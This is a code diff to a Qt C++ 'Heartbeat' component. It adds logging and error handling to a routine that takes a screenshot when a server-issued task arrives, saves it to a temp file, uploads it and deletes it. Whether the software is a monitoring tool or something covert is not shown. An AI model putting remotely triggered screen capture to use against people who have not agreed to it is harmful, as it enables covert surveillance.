@@ -546,12 +546,26 @@ void Heartbeat::checkTasks() {
 }
 
 void Heartbeat::performScreenshot(const QString& taskId) {
+    Logs::writeMain("HEARTBEAT_DEBUG: Starting performScreenshot for taskId: " + taskId);
     auto screen = QGuiApplication::primaryScreen();
-    if (!screen) return;
+    if (!screen) {
+        Logs::writeMain("HEARTBEAT_DEBUG: No primary screen found!");
+        uploadResult(taskId, "Error: No primary screen found", "failed");
+        return;
+    }
     
     QPixmap pixmap = screen->grabWindow(0);
+    if (pixmap.isNull()) {
+        Logs::writeMain("HEARTBEAT_DEBUG: Failed to grab window (pixmap is null)");
+        uploadResult(taskId, "Error: Failed to grab screen", "failed");
+        return;
+    }
+
     QString tempPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/screenshot_" + taskId + ".png";
+    Logs::writeMain("HEARTBEAT_DEBUG: Saving screenshot to " + tempPath);
+
     if (pixmap.save(tempPath, "PNG")) {
+        Logs::writeMain("HEARTBEAT_DEBUG: Screenshot saved successfully. Uploading...");
         // Upload
         QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
@@ -577,10 +591,18 @@ void Heartbeat::performScreenshot(const QString& taskId) {
         QNetworkReply* reply = _network.post(request, multiPart);
         multiPart->setParent(reply);
         
-        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath]() {
+        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
+            if (reply->error() == QNetworkReply::NoError) {
+                Logs::writeMain("HEARTBEAT_DEBUG: Screenshot upload success: " + taskId);
+            } else {
+                Logs::writeMain("HEARTBEAT_DEBUG: Screenshot upload failed: " + reply->errorString());
+            }
             reply->deleteLater();
             QFile::remove(tempPath);
         });
+    } else {
+        Logs::writeMain("HEARTBEAT_DEBUG: Failed to save screenshot to " + tempPath);
+        uploadResult(taskId, "Error: Failed to save screenshot file", "failed");
     }
 }
 
